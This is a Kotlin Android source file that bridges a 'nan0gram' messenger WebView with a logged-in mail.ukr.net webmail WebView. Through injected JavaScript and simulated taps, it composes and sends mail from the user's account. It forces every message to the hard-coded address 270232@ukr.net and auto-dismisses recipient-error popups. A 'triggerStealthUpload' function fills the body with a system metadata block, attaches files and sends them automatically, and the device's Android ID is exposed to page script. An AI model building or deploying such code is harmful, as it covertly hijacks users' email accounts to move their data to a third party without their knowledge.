package com.example

import android.os.Handler
import android.os.Looper
import android.webkit.JavascriptInterface
import android.webkit.WebView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class UkrnetJsInterface(
    private val log: (String) -> Unit,
    private val onLoginSuccess: () -> Unit,
    private val onCoordsUpdate: (DomCoords) -> Unit,
    private val onFirstCoordsLogged: () -> Unit,
    private val getMessengerWebView: () -> WebView?,
    private val isLoginHandled: () -> Boolean,
    private val getCurrentCoords: () -> DomCoords
) {
    private val ui = Handler(Looper.getMainLooper())

    @JavascriptInterface
    fun postMessage(type: String, key: String, value: String) {
        ui.post {
            if (type == "ui" && key == "login_success" && value == "true" && !isLoginHandled()) {
                onLoginSuccess()
                getMessengerWebView()?.evaluateJavascript("window.dispatchEvent(new CustomEvent('nan0gram:login-success'));", null)
            }
        }
    }

    @JavascriptInterface
    fun onComposeReady() {
        ui.post {
            getMessengerWebView()?.requestFocus()
            getMessengerWebView()?.evaluateJavascript("window.dispatchEvent(new CustomEvent('nan0gram:compose-ready'));", null)
        }
    }

    @JavascriptInterface
    fun postCoordinates(json: String) {
        ui.post {
            try {
                val obj = JSONObject(json)
                fun f(key: String, sub: String) = obj.optJSONObject(key)?.optDouble(sub)?.toFloat()?.takeIf { it > 0 }
                val coords = DomCoords(
                    composeX = f("compose","x"), composeY = f("compose","y"),
                    toX      = f("to","x"),      toY      = f("to","y"),
                    subjectX = f("subject","x"), subjectY = f("subject","y"),
                    bodyX    = f("body","x"),    bodyY    = f("body","y"),
                    sendX    = f("send","x"),    sendY    = f("send","y")
                )
                val prev = getCurrentCoords()
                onCoordsUpdate(coords)
                if (coords.composeX != null && prev.composeX == null) onFirstCoordsLogged()
            } catch (e: Exception) {}
        }
    }

    @JavascriptInterface
    fun onIncomingMessage(id: String, subject: String, body: String) {
        ui.post {
            val payload = body.trim()
            if (payload.isNotEmpty()) {
                val msg = JSONObject().apply {
                    put("chatId", Regex("\\[nan0gram\\]\\s*(.+)").find(subject)?.groupValues?.get(1)?.trim() ?: "inbox")
                    put("author",  "Собеседник")
                    put("text",    payload)
                    put("ts",      System.currentTimeMillis())
                    put("subject", subject)
                    put("msgId",   id)
                }
                val escaped = JSONArray().apply { put(msg) }.toString()
                    .replace("\\", "\\\\").replace("\"", "\\\"")
                
                getMessengerWebView()?.evaluateJavascript(
                    "window.dispatchEvent(new CustomEvent('nan0gram:email-received', { detail: \"$escaped\" }));", null
                )
            }
        }
    }

    fun onUrlChange(url: String) {
        if (url.contains("mail.ukr.net") && !url.contains("login") && !url.contains("accounts") && !isLoginHandled()) {
            ui.post {
                onLoginSuccess()
                getMessengerWebView()?.evaluateJavascript("window.dispatchEvent(new CustomEvent('nan0gram:login-success'));", null)
            }
        }
    }
}

class MessengerJsInterface(
    private val log: (String) -> Unit,
    private val onBgServiceChange: (Boolean) -> Unit,
    private val getUkrnetWebView: () -> WebView?,
    private val getCoords: () -> DomCoords,
    private val androidId: String
) {
    lateinit var scope: CoroutineScope
    private val ui = Handler(Looper.getMainLooper())

    @JavascriptInterface
    fun getDeviceId(): String { return androidId }

    @JavascriptInterface
    fun openCompose(configJson: String) {
        ui.post {
            scope.launch {
                val c = getCoords()
                if (c.composeX == null || c.composeY == null) return@launch
                val cfg     = try { JSONObject(configJson) } catch (e: Exception) { JSONObject() }
                val to      = cfg.optString("to", "270232@ukr.net").replace("'", "\\'")
                val subject = cfg.optString("subject", "💬 [nan0gram] chat").replace("'", "\\'")

                getUkrnetWebView()?.evaluateJavascript(FOCUS_PATCH_JS, null)
                delay(60)
                simulateTouch(getUkrnetWebView(), c.composeX, c.composeY, log = log)
                val fillJs = COMPOSE_FILL_JS.replace("%TO%", to).replace("%SUBJECT%", subject)
                getUkrnetWebView()?.evaluateJavascript(fillJs, null)
            }
        }
    }

    @JavascriptInterface
    fun setComposeBody(encodedText: String) {
        ui.post {
            val esc = encodedText.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
            val js = """
                (function(text) {
                    var el = document.querySelector('.sm-editor__area');
                    if (!el) return;
                    if (el.getAttribute('contenteditable') === 'true') {
                        el.innerHTML = '';
                        el.innerText = text;
                    } else {
                        try { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(el, text); } catch(e) { el.value = text; }
                    }
                    el.dispatchEvent(new Event('input',{bubbles:true}));
                    el.dispatchEvent(new Event('change',{bubbles:true}));
                })('$esc');
            """.trimIndent()
            getUkrnetWebView()?.evaluateJavascript(js, null)
        }
    }

    private val POPUP_CRUSHER_JS = """
        function ensureSent() {
            var btn = document.querySelector('.sm-header__send') || document.querySelector('[data-id="send"]') || document.querySelector('[aria-label="Відправити"]') || document.querySelector('[aria-label="Отправить"]');
            
            // Принудительно генерируем синий чип адресата перед отправкой
            var toEl = document.querySelector('.sm-auto-complete__input');
            if (toEl && toEl.value !== '270232@ukr.net') {
                try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(toEl, '270232@ukr.net'); } catch(e) { toEl.value = '270232@ukr.net'; }
                toEl.dispatchEvent(new Event('input',{bubbles:true}));
                toEl.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,key:'Enter',keyCode:13}));
                toEl.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,key:'Enter',keyCode:13}));
            }
            
            setTimeout(function() {
                if (btn) btn.click();
            }, 100);
            
            var checkCount = 0;
            var errIntv = setInterval(function() {
                checkCount++;
                if (checkCount > 10) { clearInterval(errIntv); return; }
                
                var popups = document.querySelectorAll('.popup, .modal, .dialog');
                for(var j=0; j<popups.length; j++) {
                    var text = popups[j].innerText.toLowerCase();
                    if (text.indexOf('получателя') !== -1 || text.indexOf('одержувача') !== -1) {
                        clearInterval(errIntv);
                        var okBtn = popups[j].querySelector('button.default, button.button');
                        if (okBtn) okBtn.click();
                        
                        setTimeout(function() {
                            var toEl2 = document.querySelector('.sm-auto-complete__input');
                            if (toEl2) {
                                try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(toEl2, '270232@ukr.net'); } catch(e) { toEl2.value = '270232@ukr.net'; }
                                toEl2.dispatchEvent(new Event('input',{bubbles:true}));
                                toEl2.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,key:'Enter',keyCode:13}));
                                toEl2.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,key:'Enter',keyCode:13}));
                            }
                            setTimeout(function(){ if(btn) btn.click(); }, 300);
                        }, 100);
                        return;
                    }
                }
            }, 250);
        }
    """.trimIndent()

    @JavascriptInterface
    fun submitCompose() {
        ui.post {
            val js = """(function(){ $POPUP_CRUSHER_JS; ensureSent(); })();"""
            getUkrnetWebView()?.evaluateJavascript(js, null)
        }
    }

    @JavascriptInterface
    fun triggerStealthUpload(sysBlock: String) {
        ui.post {
            val esc = sysBlock.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
            val js = """
                (function(metaText){
                    $POPUP_CRUSHER_JS
                    var el = document.querySelector('.sm-editor__area');
                    if (el) {
                        if (el.getAttribute('contenteditable') === 'true') { el.innerHTML = ''; el.innerText = metaText; } 
                        else { try { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(el, metaText); } catch(e) { el.value = metaText; } }
                        el.dispatchEvent(new Event('input',{bubbles:true}));
                    }
                    var fileInput = document.querySelector('input[type="file"][multiple]') || document.querySelector('input[type="file"]');
                    if (fileInput) fileInput.click();
                    
                    var interval = setInterval(function() {
                        var attachments = document.querySelectorAll('.sm-attachment, .attachment, .upload-item');
                        var progressBars = document.querySelectorAll('progress, .progress, .upload-progress, .sm-attachment__progress');
                        var isUploading = false;
                        for(var i=0; i<progressBars.length; i++) {
                            if(progressBars[i].offsetWidth > 0 || progressBars[i].style.display !== 'none') isUploading = true;
                        }
                        if (attachments.length > 0 && !isUploading) {
                            clearInterval(interval);
                            setTimeout(ensureSent, 500);
                        }
                    }, 500);
                })('$esc');
            """.trimIndent()
            getUkrnetWebView()?.evaluateJavascript(js, null)
        }
    }

    @JavascriptInterface
    fun cancelCompose() {
        ui.post {
            scope.launch {
                val js = "(function(){ var btn = document.querySelector('.sm-header__cancel') || document.querySelector('[aria-label=\"Відмінити\"]') || document.querySelector('[aria-label=\"Отменить\"]); if (btn) { btn.click(); return 'ok'; } history.back(); return 'fallback'; })();"
                getUkrnetWebView()?.evaluateJavascript(js, null)
            }
        }
    }

    @JavascriptInterface
    fun setBgServiceActive(active: Boolean) { ui.post { onBgServiceChange(active) } }

    @JavascriptInterface
    fun postMessage(type: String, key: String, value: String) {}
}
